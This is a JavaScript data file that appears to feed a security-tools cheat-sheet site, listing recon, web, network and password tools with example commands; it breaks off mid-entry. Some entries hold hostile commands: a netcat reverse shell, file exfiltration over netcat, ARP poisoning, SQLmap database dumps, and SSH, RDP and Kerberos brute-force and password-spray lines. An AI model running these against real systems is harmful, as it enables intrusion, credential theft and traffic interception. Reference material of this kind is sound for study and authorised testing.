module.exports = [
  // INFORMATION GATHERING
  { name:'Nmap', slug:'nmap', category:'Information Gathering', icon:'🔍', difficulty:'beginner', shortDesc:'Network discovery and security auditing', description:'Nmap is the industry-standard tool for network discovery, port scanning, service detection, and OS fingerprinting.', installation:'sudo apt install nmap', syntax:'nmap [options] <target>', keywords:['port scan','network','recon'], commands:[
    {title:'Basic Scan',command:'nmap <target>',explanation:'Scans top 1000 ports',example:'nmap 192.168.1.1'},
    {title:'Service Detection',command:'nmap -sV <target>',explanation:'Detect service versions',example:'nmap -sV 192.168.1.1'},
    {title:'OS Detection',command:'nmap -O <target>',explanation:'Detect OS',example:'nmap -O 192.168.1.1'},
    {title:'Aggressive Scan',command:'nmap -A <target>',explanation:'Full scan',example:'nmap -A 192.168.1.1'},
    {title:'All Ports',command:'nmap -p- <target>',explanation:'All 65535 ports',example:'nmap -p- 192.168.1.1'},
    {title:'Specific Ports',command:'nmap -p 22,80,443 <target>',explanation:'Specific ports',example:'nmap -p 22,80,443 192.168.1.1'},
    {title:'Script Scan',command:'nmap -sC <target>',explanation:'Default scripts',example:'nmap -sC 192.168.1.1'},
    {title:'UDP Scan',command:'nmap -sU <target>',explanation:'UDP ports',example:'nmap -sU 192.168.1.1'},
    {title:'Ping Sweep',command:'nmap -sn <target>',explanation:'Host discovery',example:'nmap -sn 192.168.1.0/24'},
    {title:'Fast Scan',command:'nmap -F <target>',explanation:'Fast top 100',example:'nmap -F 192.168.1.1'}
  ]},
  { name:'Amass', slug:'amass', category:'Information Gathering', icon:'🌐', difficulty:'intermediate', shortDesc:'DNS enumeration and network mapping', description:'Amass performs DNS enumeration, subdomain discovery, and network mapping.', installation:'sudo apt install amass', syntax:'amass enum -d <domain>', keywords:['subdomain','dns','osint'], commands:[
    {title:'Subdomain Enum',command:'amass enum -d <domain>',explanation:'Find subdomains',example:'amass enum -d example.com'},
    {title:'Passive Mode',command:'amass enum -passive -d <domain>',explanation:'Passive recon',example:'amass enum -passive -d example.com'},
    {title:'Active Recon',command:'amass enum -active -d <domain>',explanation:'Active recon',example:'amass enum -active -d example.com'},
    {title:'With Wordlist',command:'amass enum -d <domain> -w <wordlist>',explanation:'Brute force',example:'amass enum -d example.com -w subdomains.txt'},
    {title:'Intel Gather',command:'amass intel -d <domain>',explanation:'Intel gathering',example:'amass intel -d example.com'}
  ]},
  { name:'theHarvester', slug:'theharvester', category:'Information Gathering', icon:'📧', difficulty:'beginner', shortDesc:'Email and subdomain harvester', description:'theHarvester gathers emails, subdomains, hosts from public sources.', installation:'sudo apt install theharvester', syntax:'theHarvester -d <domain> -b all', keywords:['email','osint'], commands:[
    {title:'All Sources',command:'theHarvester -d <domain> -b all',explanation:'All sources',example:'theHarvester -d example.com -b all'},
    {title:'Google Only',command:'theHarvester -d <domain> -b google',explanation:'Google',example:'theHarvester -d example.com -b google'},
    {title:'Bing',command:'theHarvester -d <domain> -b bing',explanation:'Bing',example:'theHarvester -d example.com -b bing'},
    {title:'LinkedIn',command:'theHarvester -d <domain> -b linkedin',explanation:'LinkedIn',example:'theHarvester -d example.com -b linkedin'}
  ]},
  { name:'Recon-ng', slug:'recon-ng', category:'Information Gathering', icon:'🕵️', difficulty:'intermediate', shortDesc:'Web reconnaissance framework', description:'Recon-ng is a full-featured web reconnaissance framework.', installation:'sudo apt install recon-ng', syntax:'recon-ng', keywords:['osint','recon'], commands:[
    {title:'Launch',command:'recon-ng',explanation:'Open console',example:'recon-ng'},
    {title:'Marketplace',command:'marketplace search',explanation:'Browse modules',example:'marketplace search'},
    {title:'Install Module',command:'marketplace install <module>',explanation:'Install',example:'marketplace install recon/domains-hosts/hackertarget'}
  ]},
  { name:'Subfinder', slug:'subfinder', category:'Information Gathering', icon:'🔎', difficulty:'beginner', shortDesc:'Fast passive subdomain discovery', description:'Subfinder is a fast passive subdomain enumeration tool.', installation:'sudo apt install subfinder', syntax:'subfinder -d <domain>', keywords:['subdomain'], commands:[
    {title:'Basic',command:'subfinder -d <domain>',explanation:'Find subdomains',example:'subfinder -d example.com'},
    {title:'Silent',command:'subfinder -d <domain> -silent',explanation:'Clean output',example:'subfinder -d example.com -silent'},
    {title:'Save to File',command:'subfinder -d <domain> -o subs.txt',explanation:'Save results',example:'subfinder -d example.com -o subs.txt'}
  ]},
  { name:'WhatWeb', slug:'whatweb', category:'Information Gathering', icon:'🔬', difficulty:'beginner', shortDesc:'Website fingerprinting', description:'WhatWeb identifies websites and tech stacks.', installation:'sudo apt install whatweb', syntax:'whatweb <url>', keywords:['web'], commands:[
    {title:'Basic',command:'whatweb <url>',explanation:'Detect tech',example:'whatweb https://example.com'},
    {title:'Aggressive',command:'whatweb -a 3 <url>',explanation:'Aggressive',example:'whatweb -a 3 https://example.com'},
    {title:'Verbose',command:'whatweb -v <url>',explanation:'Verbose',example:'whatweb -v https://example.com'}
  ]},
  { name:'Whois', slug:'whois', category:'Information Gathering', icon:'📋', difficulty:'beginner', shortDesc:'Domain registration lookup', description:'Whois queries domain registration databases.', installation:'sudo apt install whois', syntax:'whois <domain>', keywords:['domain'], commands:[
    {title:'Domain',command:'whois <domain>',explanation:'Domain info',example:'whois example.com'},
    {title:'IP Lookup',command:'whois <ip>',explanation:'IP info',example:'whois 8.8.8.8'}
  ]},
  { name:'DNSRecon', slug:'dnsrecon', category:'Information Gathering', icon:'🌍', difficulty:'intermediate', shortDesc:'DNS enumeration script', description:'DNSRecon performs DNS enumeration and zone transfers.', installation:'sudo apt install dnsrecon', syntax:'dnsrecon -d <domain>', keywords:['dns'], commands:[
    {title:'Standard',command:'dnsrecon -d <domain>',explanation:'Standard enum',example:'dnsrecon -d example.com'},
    {title:'Zone Transfer',command:'dnsrecon -d <domain> -t axfr',explanation:'Zone transfer',example:'dnsrecon -d example.com -t axfr'},
    {title:'Reverse Lookup',command:'dnsrecon -r <range>',explanation:'Reverse lookup',example:'dnsrecon -r 192.168.1.0/24'}
  ]},
  { name:'DNSenum', slug:'dnsenum', category:'Information Gathering', icon:'📡', difficulty:'intermediate', shortDesc:'DNS enumeration', description:'DNSenum enumerates DNS info.', installation:'sudo apt install dnsenum', syntax:'dnsenum <domain>', keywords:['dns'], commands:[
    {title:'Basic',command:'dnsenum <domain>',explanation:'Enumerate',example:'dnsenum example.com'},
    {title:'With Threads',command:'dnsenum -t 10 <domain>',explanation:'10 threads',example:'dnsenum -t 10 example.com'}
  ]},
  { name:'Fierce', slug:'fierce', category:'Information Gathering', icon:'🔥', difficulty:'beginner', shortDesc:'DNS reconnaissance tool', description:'Fierce is a DNS reconnaissance tool.', installation:'sudo apt install fierce', syntax:'fierce --domain <domain>', keywords:['dns','recon'], commands:[
    {title:'Basic',command:'fierce --domain <domain>',explanation:'Scan domain',example:'fierce --domain example.com'}
  ]},

  // WEB SECURITY
  { name:'Burp Suite', slug:'burp-suite', category:'Web Security', icon:'🧪', difficulty:'intermediate', shortDesc:'Web security testing platform', description:'Burp Suite is the leading web security testing platform.', installation:'sudo apt install burpsuite', syntax:'burpsuite', keywords:['web','proxy'], commands:[
    {title:'Launch',command:'burpsuite',explanation:'Open GUI',example:'burpsuite'},
    {title:'Headless',command:'java -jar burpsuite.jar',explanation:'Headless',example:'java -jar burpsuite.jar'}
  ]},
  { name:'Nikto', slug:'nikto', category:'Web Security', icon:'🔍', difficulty:'beginner', shortDesc:'Web server scanner', description:'Nikto is a web server scanner.', installation:'sudo apt install nikto', syntax:'nikto -h <target>', keywords:['web'], commands:[
    {title:'Basic',command:'nikto -h <target>',explanation:'Scan target',example:'nikto -h http://example.com'},
    {title:'SSL',command:'nikto -h <target> -ssl',explanation:'Force SSL',example:'nikto -h https://example.com -ssl'},
    {title:'Custom Port',command:'nikto -h <target> -p 8080',explanation:'Custom port',example:'nikto -h 192.168.1.1 -p 8080'},
    {title:'With Tuning',command:'nikto -h <target> -Tuning 123',explanation:'Specific tests',example:'nikto -h http://example.com -Tuning 123'}
  ]},
  { name:'Gobuster', slug:'gobuster', category:'Web Security', icon:'📂', difficulty:'beginner', shortDesc:'Directory/DNS brute forcing', description:'Gobuster brute-forces URIs and DNS.', installation:'sudo apt install gobuster', syntax:'gobuster dir -u <url> -w <wordlist>', keywords:['dirbust'], commands:[
    {title:'Dir Mode',command:'gobuster dir -u <url> -w wordlist.txt',explanation:'Find dirs',example:'gobuster dir -u http://example.com -w common.txt'},
    {title:'DNS Mode',command:'gobuster dns -d <domain> -w wordlist.txt',explanation:'Find subdomains',example:'gobuster dns -d example.com -w subdomains.txt'},
    {title:'Vhost Mode',command:'gobuster vhost -u <url> -w wordlist.txt',explanation:'Virtual hosts',example:'gobuster vhost -u http://example.com -w vhosts.txt'},
    {title:'With Extensions',command:'gobuster dir -u <url> -w wordlist.txt -x php,html,js',explanation:'Extensions',example:'gobuster dir -u http://example.com -w common.txt -x php,html'}
  ]},
  { name:'Feroxbuster', slug:'feroxbuster', category:'Web Security', icon:'⚡', difficulty:'beginner', shortDesc:'Fast recursive content discovery', description:'Feroxbuster is a fast recursive content discovery tool.', installation:'sudo apt install feroxbuster', syntax:'feroxbuster -u <url>', keywords:['dirbust'], commands:[
    {title:'Basic',command:'feroxbuster -u <url>',explanation:'Recursive',example:'feroxbuster -u http://example.com'},
    {title:'With Extensions',command:'feroxbuster -u <url> -x php,html',explanation:'Extensions',example:'feroxbuster -u http://example.com -x php,html'},
    {title:'With Depth',command:'feroxbuster -u <url> -d 3',explanation:'Depth 3',example:'feroxbuster -u http://example.com -d 3'}
  ]},
  { name:'ffuf', slug:'ffuf', category:'Web Security', icon:'🌀', difficulty:'intermediate', shortDesc:'Fast web fuzzer', description:'ffuf is a fast web fuzzer written in Go.', installation:'sudo apt install ffuf', syntax:'ffuf -u <url>/FUZZ -w <wordlist>', keywords:['fuzz'], commands:[
    {title:'Dir Fuzz',command:'ffuf -u <url>/FUZZ -w wordlist.txt',explanation:'Fuzz dirs',example:'ffuf -u http://example.com/FUZZ -w wordlist.txt'},
    {title:'Vhost Fuzz',command:'ffuf -u <url> -H "Host: FUZZ.example.com" -w wordlist.txt',explanation:'Vhost',example:'ffuf -u http://example.com -H "Host: FUZZ.example.com" -w subdomains.txt'},
    {title:'POST Fuzz',command:'ffuf -u <url> -X POST -d "user=FUZZ&pass=test" -w wordlist.txt',explanation:'POST fuzz',example:'ffuf -u http://example.com/login -X POST -d "user=FUZZ&pass=test" -w users.txt'}
  ]},
  { name:'Dirsearch', slug:'dirsearch', category:'Web Security', icon:'📁', difficulty:'beginner', shortDesc:'Web path scanner', description:'Dirsearch brute-forces directories and files.', installation:'sudo apt install dirsearch', syntax:'dirsearch -u <url>', keywords:['dirbust'], commands:[
    {title:'Basic',command:'dirsearch -u <url>',explanation:'Scan dirs',example:'dirsearch -u http://example.com'},
    {title:'With Extensions',command:'dirsearch -u <url> -e php,html,js',explanation:'Extensions',example:'dirsearch -u http://example.com -e php,html'},
    {title:'Recursive',command:'dirsearch -u <url> -r',explanation:'Recursive',example:'dirsearch -u http://example.com -r'}
  ]},
  { name:'Wfuzz', slug:'wfuzz', category:'Web Security', icon:'🔮', difficulty:'intermediate', shortDesc:'Web application fuzzer', description:'Wfuzz is a flexible web application fuzzer.', installation:'sudo apt install wfuzz', syntax:'wfuzz -w wordlist.txt <url>/FUZZ', keywords:['fuzz'], commands:[
    {title:'Basic',command:'wfuzz -w wordlist.txt <url>/FUZZ',explanation:'Basic fuzz',example:'wfuzz -w wordlist.txt http://example.com/FUZZ'},
    {title:'With Code',command:'wfuzz -w wordlist.txt --hc 404 <url>/FUZZ',explanation:'Hide 404',example:'wfuzz -w wordlist.txt --hc 404 http://example.com/FUZZ'}
  ]},
  { name:'SQLmap', slug:'sqlmap', category:'Web Security', icon:'💉', difficulty:'intermediate', shortDesc:'Automatic SQL injection tool', description:'SQLmap automates SQL injection detection.', installation:'sudo apt install sqlmap', syntax:'sqlmap -u <url>', keywords:['sqli'], commands:[
    {title:'Test SQLi',command:'sqlmap -u "<url>"',explanation:'Test SQLi',example:'sqlmap -u "http://example.com/?id=1"'},
    {title:'List DBs',command:'sqlmap -u "<url>" --dbs',explanation:'Enumerate DBs',example:'sqlmap -u "http://example.com/?id=1" --dbs',dangerous:true},
    {title:'List Tables',command:'sqlmap -u "<url>" -D <db> --tables',explanation:'Tables',example:'sqlmap -u "http://example.com/?id=1" -D testdb --tables',dangerous:true},
    {title:'Dump Table',command:'sqlmap -u "<url>" -D <db> -T <table> --dump',explanation:'Dump',example:'sqlmap -u "http://example.com/?id=1" -D testdb -T users --dump',dangerous:true},
    {title:'POST Method',command:'sqlmap -u "<url>" --data="id=1"',explanation:'POST',example:'sqlmap -u "http://example.com/login" --data="id=1"'},
    {title:'With Cookie',command:'sqlmap -u "<url>" --cookie="<cookie>"',explanation:'Cookie',example:'sqlmap -u "http://example.com/?id=1" --cookie="session=abc123"'},
    {title:'With Tor',command:'sqlmap -u "<url>" --tor --tor-type=SOCKS5',explanation:'Anonymous',example:'sqlmap -u "http://example.com/?id=1" --tor'}
  ]},
  { name:'WPScan', slug:'wpscan', category:'Web Security', icon:'📝', difficulty:'beginner', shortDesc:'WordPress vulnerability scanner', description:'WPScan scans WordPress sites for vulnerabilities.', installation:'sudo apt install wpscan', syntax:'wpscan --url <url>', keywords:['wordpress'], commands:[
    {title:'Basic',command:'wpscan --url <url>',explanation:'Scan WP',example:'wpscan --url http://example.com'},
    {title:'Enumerate Users',command:'wpscan --url <url> --enumerate u',explanation:'Users',example:'wpscan --url http://example.com --enumerate u'},
    {title:'Enumerate Plugins',command:'wpscan --url <url> --enumerate ap',explanation:'Plugins',example:'wpscan --url http://example.com --enumerate ap'},
    {title:'Vulnerable Plugins',command:'wpscan --url <url> --enumerate vp',explanation:'Vuln plugins',example:'wpscan --url http://example.com --enumerate vp'}
  ]},
  { name:'Joomscan', slug:'joomscan', category:'Web Security', icon:'🎯', difficulty:'intermediate', shortDesc:'Joomla vulnerability scanner', description:'Joomscan scans Joomla sites for vulnerabilities.', installation:'sudo apt install joomscan', syntax:'joomscan -u <url>', keywords:['joomla','cms'], commands:[
    {title:'Basic',command:'joomscan -u <url>',explanation:'Scan Joomla',example:'joomscan -u http://example.com'}
  ]},
  { name:'Droopescan', slug:'droopescan', category:'Web Security', icon:'🎯', difficulty:'intermediate', shortDesc:'Multi-CMS scanner', description:'Droopescan scans Drupal, SilverStripe, WordPress, Joomla.', installation:'pip install droopescan', syntax:'droopescan scan <cms> -u <url>', keywords:['cms'], commands:[
    {title:'Drupal',command:'droopescan scan drupal -u <url>',explanation:'Scan Drupal',example:'droopescan scan drupal -u http://example.com'},
    {title:'WordPress',command:'droopescan scan wordpress -u <url>',explanation:'Scan WP',example:'droopescan scan wordpress -u http://example.com'}
  ]},
  { name:'Dalfox', slug:'dalfox', category:'Web Security', icon:'🦊', difficulty:'intermediate', shortDesc:'XSS scanner', description:'Dalfox is a powerful XSS scanner.', installation:'sudo apt install dalfox', syntax:'dalfox url <url>', keywords:['xss'], commands:[
    {title:'Basic',command:'dalfox url <url>',explanation:'Scan XSS',example:'dalfox url http://example.com'},
    {title:'File Mode',command:'dalfox file urls.txt',explanation:'From file',example:'dalfox file urls.txt'}
  ]},
  { name:'XSStrike', slug:'xsstrike', category:'Web Security', icon:'⚡', difficulty:'intermediate', shortDesc:'XSS detection suite', description:'XSStrike is an advanced XSS detection suite.', installation:'git clone https://github.com/s0md3v/XSStrike', syntax:'python xsstrike.py -u <url>', keywords:['xss'], commands:[
    {title:'Basic',command:'python xsstrike.py -u <url>',explanation:'Scan XSS',example:'python xsstrike.py -u "http://example.com/?q=test"'}
  ]},
  { name:'Arjun', slug:'arjun', category:'Web Security', icon:'🎯', difficulty:'intermediate', shortDesc:'HTTP parameter discovery', description:'Arjun finds hidden HTTP parameters.', installation:'pip install arjun', syntax:'arjun -u <url>', keywords:['params'], commands:[
    {title:'Basic',command:'arjun -u <url>',explanation:'Find params',example:'arjun -u http://example.com'},
    {title:'POST',command:'arjun -u <url> -m POST',explanation:'POST params',example:'arjun -u http://example.com -m POST'}
  ]},
  { name:'HTTPX', slug:'httpx', category:'Web Security', icon:'🌐', difficulty:'beginner', shortDesc:'HTTP toolkit', description:'HTTPX is a fast HTTP toolkit.', installation:'sudo apt install httpx-toolkit', syntax:'httpx -u <url>', keywords:['http'], commands:[
    {title:'Basic',command:'httpx -u <url>',explanation:'Check alive',example:'httpx -u http://example.com'},
    {title:'With Title',command:'httpx -u <url> -title',explanation:'Get title',example:'httpx -u http://example.com -title'}
  ]},
  { name:'Katana', slug:'katana', category:'Web Security', icon:'🗡️', difficulty:'intermediate', shortDesc:'Web crawler', description:'Katana is a fast web crawler.', installation:'sudo apt install katana', syntax:'katana -u <url>', keywords:['crawl'], commands:[
    {title:'Basic',command:'katana -u <url>',explanation:'Crawl',example:'katana -u http://example.com'}
  ]},
  { name:'Photon', slug:'photon', category:'Web Security', icon:'🕷️', difficulty:'intermediate', shortDesc:'Fast web crawler', description:'Photon is a fast web crawler for OSINT.', installation:'git clone https://github.com/s0md3v/Photon', syntax:'python photon.py -u <url>', keywords:['crawl','osint'], commands:[
    {title:'Basic',command:'python photon.py -u <url>',explanation:'Crawl',example:'python photon.py -u http://example.com'}
  ]},

  // NETWORK TOOLS
  { name:'Wireshark', slug:'wireshark', category:'Network Tools', icon:'🦈', difficulty:'intermediate', shortDesc:'Network protocol analyzer', description:'Wireshark is a network protocol analyzer.', installation:'sudo apt install wireshark', syntax:'wireshark', keywords:['packet'], commands:[
    {title:'Launch',command:'wireshark',explanation:'GUI',example:'wireshark'},
    {title:'CLI',command:'tshark -i eth0',explanation:'CLI mode',example:'tshark -i eth0'},
    {title:'Filter',command:'tshark -i eth0 -f "port 80"',explanation:'Filter',example:'tshark -i eth0 -f "port 80"'}
  ]},
  { name:'Tcpdump', slug:'tcpdump', category:'Network Tools', icon:'📦', difficulty:'intermediate', shortDesc:'CLI packet analyzer', description:'Tcpdump captures packets.', installation:'sudo apt install tcpdump', syntax:'tcpdump [options]', keywords:['packet'], commands:[
    {title:'Basic',command:'sudo tcpdump -i eth0',explanation:'Capture',example:'sudo tcpdump -i eth0'},
    {title:'Save to File',command:'sudo tcpdump -i eth0 -w capture.pcap',explanation:'Save',example:'sudo tcpdump -i eth0 -w capture.pcap'},
    {title:'Read File',command:'sudo tcpdump -r capture.pcap',explanation:'Read',example:'sudo tcpdump -r capture.pcap'},
    {title:'Port Filter',command:'sudo tcpdump -i eth0 port 80',explanation:'Port 80',example:'sudo tcpdump -i eth0 port 80'},
    {title:'Host Filter',command:'sudo tcpdump -i eth0 host 192.168.1.1',explanation:'Host',example:'sudo tcpdump -i eth0 host 192.168.1.1'}
  ]},
  { name:'Netcat', slug:'netcat', category:'Network Tools', icon:'🔌', difficulty:'intermediate', shortDesc:'TCP/IP swiss army knife', description:'Netcat reads/writes network data.', installation:'sudo apt install netcat', syntax:'nc [options] <host> <port>', keywords:['tcp','shell'], commands:[
    {title:'Connect',command:'nc <host> <port>',explanation:'Connect',example:'nc example.com 80'},
    {title:'Listen',command:'nc -lvnp <port>',explanation:'Listen',example:'nc -lvnp 4444',dangerous:true},
    {title:'File Transfer Send',command:'nc -w 3 <host> <port> < file.txt',explanation:'Send file',example:'nc -w 3 192.168.1.1 4444 < file.txt'},
    {title:'File Transfer Receive',command:'nc -lvnp <port> > file.txt',explanation:'Receive',example:'nc -lvnp 4444 > file.txt'},
    {title:'Reverse Shell',command:'nc -e /bin/bash <host> <port>',explanation:'Reverse shell',example:'nc -e /bin/bash 10.0.0.1 4444',dangerous:true}
  ]},
  { name:'Socat', slug:'socat', category:'Network Tools', icon:'🔗', difficulty:'advanced', shortDesc:'Multipurpose relay', description:'Socat is a bidirectional data relay.', installation:'sudo apt install socat', syntax:'socat [options] <addr1> <addr2>', keywords:['relay','tunnel'], commands:[
    {title:'Listen',command:'socat TCP-LISTEN:<port> -',explanation:'Listen TCP',example:'socat TCP-LISTEN:4444 -'},
    {title:'Connect',command:'socat - TCP:<host>:<port>',explanation:'Connect',example:'socat - TCP:example.com:80'},
    {title:'File Transfer',command:'socat TCP-LISTEN:<port> file:<file>',explanation:'Send file',example:'socat TCP-LISTEN:4444 file:passwords.txt'}
  ]},
  { name:'Ettercap', slug:'ettercap', category:'Network Tools', icon:'🕷️', difficulty:'advanced', shortDesc:'MITM attack suite', description:'Ettercap is a MITM attack suite.', installation:'sudo apt install ettercap-graphical', syntax:'ettercap [options]', keywords:['mitm'], commands:[
    {title:'GUI',command:'sudo ettercap -G',explanation:'GUI',example:'sudo ettercap -G',dangerous:true},
    {title:'Text',command:'sudo ettercap -T -i eth0',explanation:'Text mode',example:'sudo ettercap -T -i eth0',dangerous:true},
    {title:'ARP Poisoning',command:'sudo ettercap -T -M arp:remote /<gw>// /<target>//',explanation:'ARP poison',example:'sudo ettercap -T -M arp:remote /192.168.1.1// /192.168.1.5//',dangerous:true}
  ]},
  { name:'Bettercap', slug:'bettercap', category:'Network Tools', icon:'🎩', difficulty:'advanced', shortDesc:'Modern MITM framework', description:'Bettercap is a powerful MITM framework.', installation:'sudo apt install bettercap', syntax:'sudo bettercap -iface <iface>', keywords:['mitm'], commands:[
    {title:'Launch',command:'sudo bettercap -iface eth0',explanation:'Start',example:'sudo bettercap -iface eth0',dangerous:true},
    {title:'With Caplet',command:'sudo bettercap -iface eth0 -caplet http-ui',explanation:'Caplet',example:'sudo bettercap -iface eth0 -caplet http-ui'}
  ]},
  { name:'Masscan', slug:'masscan', category:'Network Tools', icon:'⚡', difficulty:'intermediate', shortDesc:'Fast port scanner', description:'Masscan is a very fast port scanner.', installation:'sudo apt install masscan', syntax:'masscan <target> -p<ports>', keywords:['port','scan'], commands:[
    {title:'Basic',command:'sudo masscan <target> -p1-65535',explanation:'All ports',example:'sudo masscan 192.168.1.0/24 -p1-65535'},
    {title:'Rate',command:'sudo masscan <target> -p80,443 --rate=1000',explanation:'Custom rate',example:'sudo masscan 192.168.1.0/24 -p80,443 --rate=1000'}
  ]},
  { name:'Rustscan', slug:'rustscan', category:'Network Tools', icon:'🦀', difficulty:'beginner', shortDesc:'Fast Rust port scanner', description:'RustScan is a fast port scanner written in Rust.', installation:'sudo apt install rustscan', syntax:'rustscan -a <target>', keywords:['port'], commands:[
    {title:'Basic',command:'rustscan -a <target>',explanation:'Scan target',example:'rustscan -a 192.168.1.1'},
    {title:'With Nmap',command:'rustscan -a <target> -- -sV',explanation:'Nmap pipe',example:'rustscan -a 192.168.1.1 -- -sV'}
  ]},
  { name:'Naabu', slug:'naabu', category:'Network Tools', icon:'🚀', difficulty:'beginner', shortDesc:'Fast port scanner', description:'Naabu is a fast port scanner.', installation:'sudo apt install naabu', syntax:'naabu -host <target>', keywords:['port'], commands:[
    {title:'Basic',command:'naabu -host <target>',explanation:'Scan',example:'naabu -host 192.168.1.1'},
    {title:'Top Ports',command:'naabu -host <target> -top-ports 1000',explanation:'Top 1000',example:'naabu -host 192.168.1.1 -top-ports 1000'}
  ]},

  // PASSWORD / AUTHENTICATION
  { name:'Hydra', slug:'hydra', category:'Password / Authentication', icon:'🐉', difficulty:'intermediate', shortDesc:'Fast password cracking tool', description:'Hydra is a login cracker.', installation:'sudo apt install hydra', syntax:'hydra [options] <target>', keywords:['brute'], commands:[
    {title:'SSH Brute',command:'hydra -l <user> -P <wordlist> ssh://<target>',explanation:'SSH brute',example:'hydra -l root -P pass.txt ssh://192.168.1.1',dangerous:true},
    {title:'FTP Brute',command:'hydra -l <user> -P <wordlist> ftp://<target>',explanation:'FTP brute',example:'hydra -l admin -P pass.txt ftp://192.168.1.1',dangerous:true},
    {title:'HTTP POST',command:'hydra -l <user> -P <wordlist> <target> http-post-form "/login:u=^USER^&p=^PASS^:F=fail"',explanation:'HTTP',example:'hydra -l admin -P pass.txt 192.168.1.1 http-post-form "/login:u=^USER^&p=^PASS^:F=fail"',dangerous:true},
    {title:'HTTP Basic',command:'hydra -l <user> -P <wordlist> <target> http-get',explanation:'HTTP basic',example:'hydra -l admin -P pass.txt 192.168.1.1 http-get',dangerous:true},
    {title:'MySQL Brute',command:'hydra -l <user> -P <wordlist> mysql://<target>',explanation:'MySQL',example:'hydra -l root -P pass.txt mysql://192.168.1.1',dangerous:true},
    {title:'RDP Brute',command:'hydra -l <user> -P <wordlist> rdp://<target>',explanation:'RDP',example:'hydra -l admin -P pass.txt rdp://192.168.1.1',dangerous:true}
  ]},
  { name:'John the Ripper', slug:'john', category:'Password / Authentication', icon:'🗝️', difficulty:'intermediate', shortDesc:'Password cracker', description:'John the Ripper cracks password hashes.', installation:'sudo apt install john', syntax:'john [options] <hashfile>', keywords:['hash','crack'], commands:[
    {title:'Basic',command:'john hashes.txt',explanation:'Crack',example:'john hashes.txt'},
    {title:'Wordlist',command:'john --wordlist=rockyou.txt hashes.txt',explanation:'Wordlist',example:'john --wordlist=rockyou.txt hashes.txt'},
    {title:'Show Cracked',command:'john --show hashes.txt',explanation:'Show',example:'john --show hashes.txt'},
    {title:'Specific Format',command:'john --format=md5 hashes.txt',explanation:'Format',example:'john --format=md5 hashes.txt'},
    {title:'Incremental',command:'john --incremental hashes.txt',explanation:'Incremental',example:'john --incremental hashes.txt'},
    {title:'Rules',command:'john --wordlist=wordlist.txt --rules hashes.txt',explanation:'With rules',example:'john --wordlist=wordlist.txt --rules hashes.txt'}
  ]},
  { name:'Hashcat', slug:'hashcat', category:'Password / Authentication', icon:'🔓', difficulty:'advanced', shortDesc:'GPU password recovery', description:'Hashcat is a GPU password cracker.', installation:'sudo apt install hashcat', syntax:'hashcat -m <mode> -a <attack> <hashfile> <wordlist>', keywords:['gpu','hash'], commands:[
    {title:'MD5',command:'hashcat -m 0 -a 0 hashes.txt rockyou.txt',explanation:'MD5',example:'hashcat -m 0 -a 0 hashes.txt rockyou.txt'},
    {title:'SHA1',command:'hashcat -m 100 -a 0 hashes.txt rockyou.txt',explanation:'SHA1',example:'hashcat -m 100 -a 0 hashes.txt rockyou.txt'},
    {title:'SHA256',command:'hashcat -m 1400 -a 0 hashes.txt rockyou.txt',explanation:'SHA256',example:'hashcat -m 1400 -a 0 hashes.txt rockyou.txt'},
    {title:'NTLM',command:'hashcat -m 1000 -a 0 hashes.txt rockyou.txt',explanation:'NTLM',example:'hashcat -m 1000 -a 0 hashes.txt rockyou.txt'},
    {title:'Brute Force',command:'hashcat -m 0 -a 3 hashes.txt ?a?a?a?a',explanation:'Brute force',example:'hashcat -m 0 -a 3 hashes.txt ?a?a?a?a'},
    {title:'Rules',command:'hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule',explanation:'Rules',example:'hashcat -m 0 -a 0 hashes.txt rockyou.txt -r rules/best64.rule'}
  ]},
  { name:'Medusa', slug:'medusa', category:'Password / Authentication', icon:'🐍', difficulty:'intermediate', shortDesc:'Parallel login brute forcer', description:'Medusa is a login brute-forcer.', installation:'sudo apt install medusa', syntax:'medusa [options]', keywords:['brute'], commands:[
    {title:'SSH',command:'medusa -h <host> -u <user> -P <wordlist> -M ssh',explanation:'SSH',example:'medusa -h 192.168.1.1 -u root -P pass.txt -M ssh',dangerous:true},
    {title:'FTP',command:'medusa -h <host> -u <user> -P <wordlist> -M ftp',explanation:'FTP',example:'medusa -h 192.168.1.1 -u admin -P pass.txt -M ftp',dangerous:true},
    {title:'Web Form',command:'medusa -h <host> -u <user> -P <wordlist> -M http',explanation:'Web',example:'medusa -h 192.168.1.1 -u admin -P pass.txt -M http',dangerous:true}
  ]},
  { name:'Ncrack', slug:'ncrack', category:'Password / Authentication', icon:'🔓', difficulty:'intermediate', shortDesc:'Network authentication cracker', description:'Ncrack is a high-speed network authentication cracking tool.', installation:'sudo apt install ncrack', syntax:'ncrack [options] <target>', keywords:['brute'], commands:[
    {title:'SSH',command:'ncrack -U users.txt -P pass.txt ssh://<target>',explanation:'SSH',example:'ncrack -U users.txt -P pass.txt ssh://192.168.1.1',dangerous:true},
    {title:'RDP',command:'ncrack -U users.txt -P pass.txt rdp://<target>',explanation:'RDP',example:'ncrack -U users.txt -P pass.txt rdp://192.168.1.1',dangerous:true}
  ]},
  { name:'Kerbrute', slug:'kerbrute', category:'Password / Authentication', icon:'🎫', difficulty:'advanced', shortDesc:'Kerberos brute forcer', description:'Kerbrute is a tool for Kerberos pre-auth brute force.', installation:'go install github.com/ropnop/kerbrute@latest', syntax:'kerbrute [command]', keywords:['kerberos','ad'], commands:[
    {title:'User Enum',command:'kerbrute userenum --dc <dc> -d <domain> users.txt',explanation:'User enum',example:'kerbrute userenum --dc 192.168.1.1 -d example.com users.txt'},
    {title:'Password Spray',command:'kerbrute passwordspray --dc <dc> -d <domain> users.txt <password>',explanation:'Spray',example:'kerbrute passwordspray --dc 192.168.1.1 -d example.com users.txt Password123',dangerous:true}
  ]},
  { name:'CeWL', slug:'cewl', category:'Password / Authentication', icon:'🕸️', difficulty:'beginner', shortDesc:'Custom wordlist generator', description:'CeWL spiders sites for wordlists.', installation:'sudo apt install cewl', syntax:'cewl <url> -w <output>', keywords:['wordlist'], commands:[
    {title:'Basic',command:'cewl <url> -w wordlist.txt',explanation:'Scrape',example:'cewl http://example.com -w wordlist.txt'},
    {title:'With Depth',command:'cewl <url> -d 3 -w wordlist.txt',explanation:'Depth 3',example:'cewl http://example.com -d 3 -w wordlist.txt'},
    {title:'Min Length',command:'cewl <url> -m 5 -w wordlist.txt',explanation:'Min 5 chars',example:'cewl http://example.com -m 5 -w wordlist.txt'}
  ]},
  { name:'Crunch', slug:'crunch', category:'Password / Authentication', icon:'🧮', difficulty:'beginner', shortDesc:'Wordlist generator', description:'Crunch generates wordlists.', installation:'sudo apt install crunch', syntax:'crunch <min> <max> [charset]', keywords:['wordlist'], commands:[
